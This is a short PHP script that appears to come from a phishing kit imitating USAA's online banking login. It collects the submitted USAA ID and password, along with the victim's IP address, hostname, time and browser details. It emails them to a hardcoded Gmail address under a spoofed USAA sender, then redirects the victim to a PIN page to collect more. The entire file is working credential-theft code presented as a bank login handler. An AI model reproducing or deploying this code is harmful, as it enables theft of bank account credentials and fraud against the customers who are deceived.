<?php 
$Ok= "sheriffyoung001@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$fuck  = "================== Logon ==================\n";
$fuck .= "USAA ID : ".$_POST['userid']."\n";
$fuck .= "Password : ".$_POST['password']."\n";
$fuck .= "============= [ Ip & Hostname Info ] =============\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "=============+FishFlow+===========\n";
$subject = "USAA ID & PASS $ip";
$headers = "From: uSAa <usaa@zenquel.com>";
mail($Ok,$subject,$fuck,$headers);
Header ("Location: pin.php?id=usaaonline");
?>